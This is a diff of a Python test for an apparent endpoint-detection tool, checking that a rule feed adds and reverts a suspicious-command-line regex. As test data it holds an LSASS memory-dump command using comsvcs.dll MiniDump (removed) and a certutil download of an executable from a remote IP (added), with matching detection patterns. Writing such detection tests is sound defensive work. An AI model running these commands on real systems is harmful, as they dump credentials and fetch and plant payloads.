@@ -59,14 +59,15 @@ def test_apply_is_idempotent_and_duplicates_are_not_added():
 def test_edr_regex_rule_recompiles_the_union():
     from aegis.agents.edr.tools import parent_process_tree
     import aegis.agents.edr.tools as edr_tools
-    cmd = "rundll32.exe comsvcs.dll MiniDump 624 C:\\\\lsass.dmp full"
+    # comsvcs MiniDump is now a built-in rule (review round 3 G7-8); the feed adds a certutil download instead
+    cmd = "certutil.exe -urlcache -split -f http://198.51.100.9/a.exe C:\\\\Users\\\\Public\\\\a.exe"
     assert not edr_tools._CMDLINE_RX.search(cmd)
     applier = RuleApplier()
     rep = applier.apply([_rule(rid="SP-3", target="aegis.agents.edr.tools._SUSPICIOUS_CMDLINE_PATTERNS",
-                               add=r"comsvcs\.dll\s+MiniDump")])
+                               add=r"certutil(?:\.exe)?\s+-urlcache\s+-split\s+-f")])
     assert rep.ok
     assert edr_tools._CMDLINE_RX.search(cmd)   # derived regex rebuilt by the post-apply hook
-    res = parent_process_tree("cmd.exe", "rundll32.exe", cmd)
+    res = parent_process_tree("cmd.exe", "certutil.exe", cmd)
     assert res is not None
     applier.revert_all()
     assert not edr_tools._CMDLINE_RX.search(cmd)
